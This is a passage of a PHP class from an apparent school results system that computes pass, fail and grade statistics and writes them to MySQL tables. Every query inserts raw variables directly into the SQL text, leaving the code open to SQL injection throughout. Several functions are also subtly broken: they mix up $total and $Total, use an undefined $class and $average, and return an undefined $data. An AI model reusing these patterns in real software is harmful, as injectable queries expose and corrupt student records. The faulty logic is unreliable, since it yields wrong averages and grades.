    $query=mysqli_query(dbass::Connect(),"SELECT min(average) from psession_statistical_analysis where session='$session' and class='$class'");
    while($res=mysqli_fetch_array($query))
    {
      $news=$res[0];
    }    

    return $news;
  }

  public static function CountSubjectScore($class,$session,$term,$subject,$total)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total='$total' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSubjectFail($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total<50 ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSubjectPass($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total>49 ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function GetSubjectLeastScore($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT min(total) from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject'");
    while($rs=mysqli_fetch_array($query))
    {
        $count=$rs[0];
    }
    
    
    return $count;
  }  


  public static function ReadSubjectLeastScoreStudents($class,$session,$term,$subject)
  {
    $leastScore=Analysis::GetSubjectLeastScore($class,$session,$term,$subject);

    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and class='$class' and term='$term' and subject='$subject' and total='$leastScore' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news))){
        array_push($news, $res['reg_no']);
      }
    }
    return $news;
  }  

  public static function GetSubjectHighestScore($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(total) from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject'");
    while($rs=mysqli_fetch_array($query))
    {
        $count=$rs[0];
    }
    
    
    return $count;
  }  

  public static function GetTermHighestScore($class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(total) from presult_analysis where class='$class' and  session='$session' and  term='$term'");
    while($rs=mysqli_fetch_array($query))
    {
        $count=$rs[0];
    }
    
    
    return $count;
  }    

  public static function GetSessionHighestScore($class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(total) from psession_statistical_analysis where class='$class' and  session='$session'");
    while($rs=mysqli_fetch_array($query))
    {
        $count=$rs[0];
    }    
    
    return $count;
  }   

  /** This is to Read All Activities*/
  public static function ReadSubjectScoreStudents($class,$session,$term,$subject,$score){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and class='$class' and term='$term' and subject='$subject' and total='$score' order by total  desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
  }  

  /** This is to Read All Activities*/
  public static function ReadTermScoreStudents($class,$session,$term,$score){
        
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and class='$class' and term='$term' and total='$score' order by total  desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
  }

  /** This is to Read All Activities*/
  public static function ReadSessionScoreStudents($class,$session,$score){
        
        $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' and total='$score' order by total  desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
  }

  public static function CountSubjectBest($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total>=85 ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }    

  public static function CountTermBest($class,$session,$term)
  {
    $subCount=Module::CountSubjectsp($class);
    $score=(84/100)*(100*$subCount);    
    $score=round($score);
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and total>'$score' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }      

  public static function CountSessionBest($class,$session)
  {
    $subCount=Module::CountSubjectsp($class);
    $score=(84/100)*(300*$subCount);    
    $score=round($score);
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and total>'$score' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  } 

  /** This is to Read All Activities*/
  public static function ReadSubjectBestStudents($class,$session,$term,$subject,$score){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total>=85  order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  /** This is to Read All Activities*/
  public static function ReadTermBestStudents($class,$session,$term){      
        $subCount=Module::CountSubjectsp($class);
        $score=(84/100)*(100*$subCount);   
        $score=round($score);
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and total>'$score'  order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  /** This is to Read All Activities*/
  public static function ReadSessionBestStudents($class,$session){      
        $subCount=Module::CountSubjectsp($class);
        $score=(84/100)*(300*$subCount);   
        $score=round($score);
        $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and total>'$score'  order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  public static function CountSubjectAverage($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and  subject='$subject' and (total>=50 and  total<=84)");
    $count=mysqli_num_rows($query);
    
    return $count;
  }   

  public static function CountTermAverage($class,$session,$term)
  {
    $subCount=Module::CountSubjectsp($class);
    $score1=(84/100)*(100*$subCount);    
    $score2=(50/100)*(100*$subCount);    
    $score1=round($score1);
    $score2=round($score2);
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and (total>='$score2' and  total<='$score1')");
    $count=mysqli_num_rows($query);
    
    return $count;
  }      

  public static function CountSessionAverage($class,$session)
  {
    $subCount=Module::CountSubjectsp($class);
    $score1=(83.99/100)*(300*$subCount);    
    $score2=(50/100)*(300*$subCount);    
    $score1=round($score1);
    $score2=round($score2);
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and (total>='$score2' and  total<='$score1')");
    $count=mysqli_num_rows($query);
    
    return $count;
  }   

  /** This is to Read All Activities*/
  public static function ReadSubjectAverageStudents($class,$session,$term,$subject,$score){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and (total>=50 and  total<=84)  order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }     

  /** This is to Read All Activities*/
  public static function ReadTermAverageStudents($class,$session,$term){
      $subCount=Module::CountSubjectsp($class);
      $score1=(84/100)*(100*$subCount);    
      $score2=(50/100)*(100*$subCount); 
      $score1=round($score1);
      $score2=round($score2);
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and (total>='$score2' and  total<='$score1')  order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
  }       

  /** This is to Read All Activities*/
  public static function ReadSessionAverageStudents($class,$session){
    $subCount=Module::CountSubjectsp($class);
    $score1=(83.99/100)*(300*$subCount);    
    $score2=(50/100)*(300*$subCount); 
    $score1=round($score1);
    $score2=round($score2);
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and (total>='$score2' and  total<='$score1')  order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news))){
        array_push($news, $res['reg_no']);
      }
    }

    return $news;
   }
   
  public static function CountSubjectPoor($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total<=49 ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }   
   
  public static function CountTermPoor($class,$session,$term)
  {
    $subCount=Module::CountSubjectsp($class);
    $score=(50/100)*(100*$subCount);
    $score=round($score);
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and total<'$score' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }  
   
  public static function CountSessionPoor($class,$session)
  {
    $subCount=Module::CountSubjectsp($class);
    $score=(50/100)*(300*$subCount);
    $score=round($score);
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and total<'$score' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }  

  /** This is to Read All Activities*/
  public static function ReadSubjectPoorStudents($class,$session,$term,$subject,$score){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and total<=49   order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  /** This is to Read All Activities*/
  public static function ReadTermPoorStudents($class,$session,$term){
      
        $subCount=Module::CountSubjectsp($class);
        $score=(50/100)*(100*$subCount);
        $score=round($score);
        
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term' and total<'$score'   order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  /** This is to Read All Activities*/
  public static function ReadSessionPoorStudents($class,$session){
      
        $subCount=Module::CountSubjectsp($class);
        $score=(50/100)*(300*$subCount);
        $score=round($score,2);
        
        $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session' and total<'$score' order by total desc");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!(in_array($res['reg_no'], $news))){
            array_push($news, $res['reg_no']);
          }
        }

        return $news;
   }

  public static function CountTotalSubjectCandidates($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountTotalTermCandidates($class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where class='$class' and  session='$session' and  term='$term'");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountTotalSessionCandidates($class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where class='$class' and  session='$session'");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSubjectPassed($session, $term, $class, $reg_no)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and reg_no='$reg_no' and total>=49.5");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSubjectFailed($session, $term, $class, $reg_no)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and reg_no='$reg_no' and total<49.5");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function ExtractCA1Summary($reg_no,$class,$session,$term)
  {

    $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_1) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=count(Module::ReadStudentRegisteredSubjects($reg_no,$session,$term));

    if($Total>0){
      $Average=($Total/(10*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];
    
    return $data;
  }
  
  public static function ExtractCA2Summary($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_2) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=count(Module::ReadStudentRegisteredSubjects($reg_no,$session,$term));

    if($Total>0){
      $Average=($Total/(10*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  public static function ExtractCA3Summary($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_3) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=count(Module::ReadStudentRegisteredSubjects($reg_no,$session,$term));

    if($Total>0){
      $Average=($Total/(10*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  public static function ExtractTotalCASummary($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_total) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=Module::CountStudentSubjectsp($reg_no,$class,$session,$term);

     
    if($Total>0){
      $Average=($Total/(30*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  public static function ExtractExamSummary($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(exam) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=count(Module::ReadStudentRegisteredSubjects($reg_no,$session,$term));

    if($Total>0){
      $Average=($Total/(70*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  public static function ExtractOverallSummary($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$reg_no' and class='$class' and  session='$session' and  term='$term' ");
    while($res=mysqli_fetch_array($query))
    {
      $Total=$res[0];
    }

    $courseCount=count(Module::ReadStudentRegisteredSubjects($reg_no,$session,$term));

    if($Total>0){
      $Average=($Total/(100*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  public static function ExtractSessionSummary($reg_no,$class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$reg_no' and class='$class' and  session='$session' ");
    while($res=mysqli_fetch_array($query))
    {
      $total=$res[0];
    }

    $courseCount=Module::CountSubjectsp($class);
    
    if($Total>0){
      $Average=($Total/(300*$courseCount))*100;
    }
    else
    {
      $Average=0.0;
    }
    

    $scoreDetails=Grades::ReadScoreDetails($Average);



    $data['total']=$Total;
    $data['average']=round($Average,2);
    $data['remark']=$scoreDetails['grade_remark_anal'];
    $data['grade']=$scoreDetails['grade_symbol'];

    
    return $data;
  }
  
  
  
  public static function ExtractSessionSummary1($reg_no,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$reg_no'  and  session='$session' ");
    while($res=mysqli_fetch_array($query))
    {
      $total=$res[0];
    }

    $courseCount=Module::CountSubjectsp($class);
    if($total<=((49/100)*($courseCount*5700)))
    {
      $Remark="Fail";
      $Grade="F";
    }
    elseif($total<=((59/100)*($courseCount*5700)))
    {
      $Remark="Fair";
      $Grade="D";
    }
    elseif($total<=((69/100)*($courseCount*5700)))
    {
      $Remark="Pass";
      $Grade="D";
    }
    elseif($total<=((78/100)*($courseCount*5700)))
    {
      $Remark="Credit";
      $Grade="C";
    }
    elseif($total<=((89/100)*($courseCount*5700)))
    {
      $Remark="Very Good";
      $Grade="B";
    }
    else
    {
      $Remark="Excellent";
      $Grade="A";
    }

    $Average=round(($Total/$courseCount),2);

    $data['total']=$total;
    $data['grade']=$Grade;
    $data['remark']=$Remark;
    $data['average']=$average;
    
    return $data;
  }

  /** Is Statistical data exist*/
  public static function IsStatisticsExist($reg_no,$class,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from pstatistical_analysis where reg_no='$reg_no' and  class='$class' and  session='$session' and term='$term' ");
    $count=mysqli_num_rows($query);
    if($count>0)
    {
      $rs=true;
    }
    else
    {
      $rs=false;
    }
    return $rs;
  }

  /** Is Statistical data exist*/
  public static function IsSessionStatisticsExist($reg_no,$class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where reg_no='$reg_no' and  class='$class' and  session='$session'");
    $count=mysqli_num_rows($query);
    if($count>0)
    {
      $rs=true;
    }
    else
    {
      $rs=false;
    }
    return $rs;
  }

  /** Is Statistical data exist*/
  public static function IsSessionSubjectStatisticsExist($reg_no,$class,$session,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where reg_no='$reg_no' and  class='$class' and  session='$session' and  subject='$subject'");
    $count=mysqli_num_rows($query);
    if($count>0)
    {
      $rs=true;
    }
    else
    {
      $rs=false;
    }
    return $rs;
  }

  public static function ProcessStatistics($reg_no,$class,$session,$term)
  {

    $ca1=Analysis::ExtractCA1Summary($reg_no,$class,$session,$term);
    $ca2=Analysis::ExtractCA2Summary($reg_no,$class,$session,$term);
    $ca3=Analysis::ExtractCA3Summary($reg_no,$class,$session,$term);
    $totalca=Analysis::ExtractTotalCASummary($reg_no,$class,$session,$term);
    $exam=Analysis::ExtractExamSummary($reg_no,$class,$session,$term);
    $overall=Analysis::ExtractOverallSummary($reg_no,$class,$session,$term);
    $sessions=Analysis::ExtractSessionSummary($reg_no,$class,$session);

    if(!(Analysis::IsStatisticsExist($reg_no,$class,$session,$term)))
    {
      if(Analysis::Add($reg_no,$class,$session,$term,$ca1['total'],$ca1['grade'],$ca1['remark'],$ca1['average'],$ca2['total'],$ca2['grade'],$ca2['remark'],$ca2['average'],$ca3['total'],$ca3['grade'],$ca3['remark'],$ca3['average'],$totalca['total'],$totalca['grade'],$totalca['remark'],$totalca['average'],$exam['total'],$exam['grade'],$exam['remark'],$exam['average'],$overall['total'],$overall['grade'],$overall['remark'],$overall['average'],$sessions['total'],$sessions['grade'],$sessions['remark'],$sessions['average']))
      {
        echo "$reg_no Analysis Record Created <br/>";
      }
      else
      {
        echo "$reg_no Analysis Record Not Created <br/>";
      }
    }
    else
    {
      if(Analysis::Update($reg_no,$class,$session,$term,$ca1['total'],$ca1['grade'],$ca1['remark'],$ca1['average'],$ca2['total'],$ca2['grade'],$ca2['remark'],$ca2['average'],$ca3['total'],$ca3['grade'],$ca3['remark'],$ca3['average'],$totalca['total'],$totalca['grade'],$totalca['remark'],$totalca['average'],$exam['total'],$exam['grade'],$exam['remark'],$exam['average'],$overall['total'],$overall['grade'],$overall['remark'],$overall['average'],$sessions['total'],$sessions['grade'],$sessions['remark'],$sessions['average']))
      {
        echo "$reg_no Analysis Record Modified <br/>";
      }
      else
      {
        echo "$reg_no Analysis Record not Modified <br/>";
      }
    }

    return $data;
  }

  public static function ProcessClassStatistics($class,$session,$term)
  {
    $Students=Module::ReadClassStudentsp($class);
    foreach($Students as $reg_no)
    {
      Analysis::ProcessStatistics($reg_no,$class,$session,$term)."<br/>";
    }
  }

  /** This is the module that adds an Activity */
  public static function AddSessionStatistics($reg_no,$class,$session,$session_total,$session_grade,$session_remark,$session_average)
  {
    if(!(Analysis::IsSessionStatisticsExist($reg_no,$class,$session)))
    {        
        $query=mysqli_query(dbass::Connect(),"INSERT into 
          psession_statistical_analysis (`reg_no`,`class`,`session`,`total`,`grade`,`remark`,`average`) 
          values('$reg_no','$class','$session','$session_total','$session_grade','$session_remark','$session_average')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }
    }
    return $news;
  }

  /** This is to Modify Fee*/
  public static function UpdateSessionStatistics($reg_no,$class,$session,$session_total,$session_grade,$session_remark,$session_average){
    $query=mysqli_query(dbass::Connect(),"UPDATE psession_statistical_analysis set total='$session_total', grade='$session_grade', `remark`='$session_remark', `average`='$session_average'  where reg_no='$reg_no' and class='$class' and session='$session'");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  /** This is the module that adds an Activity */
  public static function Add($reg_no,$class,$session,$term,$ca1_total,$ca1_grade,$ca1_remark,$ca1_average,$ca2_total,$ca2_grade,$ca2_remark,$ca2_average,$ca3_total,$ca3_grade,$ca3_remark,$ca3_average,$totalca_total,$totalca_grade,$totalca_remark,$totalca_average,$exam_total,$exam_grade,$exam_remark,$exam_average,$overall_total,$overall_grade,$overall_remark,$overall_average,$session_total,$session_grade,$session_remark,$session_average)
  {
    if(!(Analysis::IsSessionStatisticsExist($reg_no,$class,$session)))
    {
      if(Analysis::AddSessionStatistics($reg_no,$class,$session,$session_total,$session_grade,$session_remark,$session_average))
      {
        if(!(Analysis::IsStatisticsExist($reg_no,$class,$session,$term)))
        {        
          $query=mysqli_query(dbass::Connect(),"INSERT into 
            pstatistical_analysis (`reg_no`,`class`,`session`,`term`,`ca1_total`,`ca1_grade`,`ca1_remark`,`ca1_average`,`ca2_total`,`ca2_grade`,`ca2_remark`,`ca2_average`,`ca3_total`,`ca3_grade`,`ca3_remark`,`ca3_average`,`totalca_total`,`totalca_grade`,`totalca_remark`,`totalca_average`,`exam_total`,`exam_grade`,`exam_remark`,`exam_average`,`overall_total`,`overall_grade`,`overall_remark`,`overall_average`) 
            values('$reg_no','$class','$session','$term','$ca1_total','$ca1_grade','$ca1_remark','$ca1_average','$ca2_total','$ca2_grade','$ca2_remark','$ca2_average','$ca3_total','$ca3_grade','$ca3_remark','$ca3_average','$totalca_total','$totalca_grade','$totalca_remark','$totalca_average','$exam_total','$exam_grade','$exam_remark','$exam_average','$overall_total','$overall_grade','$overall_remark','$overall_average')");
          if($query){
            $news=true;
          }
          else{
            $news=false;
          }
        }

      }
      else
      {
        echo "Session Statistics not added";
      }
    }   
    else{        
        if(!(Analysis::IsStatisticsExist($reg_no,$class,$session,$term)))
        {        
          $query=mysqli_query(dbass::Connect(),"INSERT into 
            pstatistical_analysis (`reg_no`,`class`,`session`,`term`,`ca1_total`,`ca1_grade`,`ca1_remark`,`ca1_average`,`ca2_total`,`ca2_grade`,`ca2_remark`,`ca2_average`,`ca3_total`,`ca3_grade`,`ca3_remark`,`ca3_average`,`totalca_total`,`totalca_grade`,`totalca_remark`,`totalca_average`,`exam_total`,`exam_grade`,`exam_remark`,`exam_average`,`overall_total`,`overall_grade`,`overall_remark`,`overall_average`) 
            values('$reg_no','$class','$session','$term','$ca1_total','$ca1_grade','$ca1_remark','$ca1_average','$ca2_total','$ca2_grade','$ca2_remark','$ca2_average','$ca3_total','$ca3_grade','$ca3_remark','$ca3_average','$totalca_total','$totalca_grade','$totalca_remark','$totalca_average','$exam_total','$exam_grade','$exam_remark','$exam_average','$overall_total','$overall_grade','$overall_remark','$overall_average')");
          if($query){
            $news=true;
          }
          else{
            $news=false;
          }
        }
    }   

    return $news;
  }

  /** This is to Modify Fee*/
  public static function Update($reg_no,$class,$session,$term,$ca1_total,$ca1_grade,$ca1_remark,$ca1_average,$ca2_total,$ca2_grade,$ca2_remark,$ca2_average,$ca3_total,$ca3_grade,$ca3_remark,$ca3_average,$totalca_total,$totalca_grade,$totalca_remark,$totalca_average,$exam_total,$exam_grade,$exam_remark,$exam_average,$overall_total,$overall_grade,$overall_remark,$overall_average,$session_total,$session_grade,$session_remark,$session_average){
    if(Analysis::UpdateSessionStatistics($reg_no,$class,$session,$session_total,$session_grade,$session_remark,$session_average))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE pstatistical_analysis set ca1_total='$ca1_total', ca1_grade='$ca1_grade', `ca1_remark`='$ca1_remark', `ca1_average`='$ca1_average',ca2_total='$ca2_total', ca2_grade='$ca2_grade', `ca2_remark`='$ca2_remark', `ca2_average`='$ca2_average',ca3_total='$ca3_total', ca3_grade='$ca3_grade', `ca3_remark`='$ca3_remark', `ca3_average`='$ca3_average',totalca_total='$totalca_total', totalca_grade='$totalca_grade', `totalca_remark`='$totalca_remark', `totalca_average`='$totalca_average',exam_total='$exam_total', exam_grade='$exam_grade', `exam_remark`='$exam_remark', `exam_average`='$exam_average',overall_total='$overall_total', overall_grade='$overall_grade', `overall_remark`='$overall_remark', `overall_average`='$overall_average'  where reg_no='$reg_no' and class='$class' and session='$session' and term='$term'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }
    

    return $news;
  }

  /** This is to Modify Fee*/
  public static function UpdateSessionPosition($class,$session,$total,$position){
      $query=mysqli_query(dbass::Connect(),"UPDATE psession_statistical_analysis set position='$position' where  class='$class' and session='$session' and total='$total'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    

    return $news;
  }

  /** This is to Read Voucher Details*/
  public static function ReadStatisticalAnalysisDetails($reg_no,$class,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstatistical_analysis where reg_no='$reg_no' and class='$class' and session='$session' and term='$term'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['reg_no']=$res['reg_no'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['ca1_total']=$res['ca1_total'];
        $news['ca1_grade']=$res['ca1_grade'];
        $news['ca1_remark']=$res['ca1_remark'];
        $news['ca1_average']=$res['ca1_average'];
        $news['ca2_total']=$res['ca2_total'];
        $news['ca2_grade']=$res['ca2_grade'];
        $news['ca2_remark']=$res['ca2_remark'];
        $news['ca2_average']=$res['ca2_average'];
        $news['ca3_total']=$res['ca3_total'];
        $news['ca3_grade']=$res['ca3_grade'];
        $news['ca3_remark']=$res['ca3_remark'];
        $news['ca3_average']=$res['ca3_average'];
        $news['totalca_total']=$res['totalca_total'];
        $news['totalca_grade']=$res['totalca_grade'];
        $news['totalca_remark']=$res['totalca_remark'];
        $news['totalca_average']=$res['totalca_average'];
        $news['exam_total']=$res['exam_total'];
        $news['exam_grade']=$res['exam_grade'];
        $news['exam_remark']=$res['exam_remark'];
        $news['exam_average']=$res['exam_average'];
        $news['overall_total']=$res['overall_total'];
        $news['overall_grade']=$res['overall_grade'];
        $news['overall_remark']=$res['overall_remark'];
        $news['overall_average']=$res['overall_average'];
      }
      
      return $news;
  }
  
  
  /** This is to Read Voucher Details*/
  public static function ReadTermStatisticalAnalysisDetails($reg_no,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstatistical_analysis where reg_no='$reg_no' and session='$session' and term='$term'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['reg_no']=$res['reg_no'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['ca1_total']=$res['ca1_total'];
        $news['ca1_grade']=$res['ca1_grade'];
        $news['ca1_remark']=$res['ca1_remark'];
        $news['ca1_average']=$res['ca1_average'];
        $news['ca2_total']=$res['ca2_total'];
        $news['ca2_grade']=$res['ca2_grade'];
        $news['ca2_remark']=$res['ca2_remark'];
        $news['ca2_average']=$res['ca2_average'];
        $news['ca3_total']=$res['ca3_total'];
        $news['ca3_grade']=$res['ca3_grade'];
        $news['ca3_remark']=$res['ca3_remark'];
        $news['ca3_average']=$res['ca3_average'];
        $news['totalca_total']=$res['totalca_total'];
        $news['totalca_grade']=$res['totalca_grade'];
        $news['totalca_remark']=$res['totalca_remark'];
        $news['totalca_average']=$res['totalca_average'];
        $news['exam_total']=$res['exam_total'];
        $news['exam_grade']=$res['exam_grade'];
        $news['exam_remark']=$res['exam_remark'];
        $news['exam_average']=$res['exam_average'];
        $news['overall_total']=$res['overall_total'];
        $news['overall_grade']=$res['overall_grade'];
        $news['overall_remark']=$res['overall_remark'];
        $news['overall_average']=$res['overall_average'];
      }
      
      return $news;
  }

  /** This is to Read Voucher Details*/
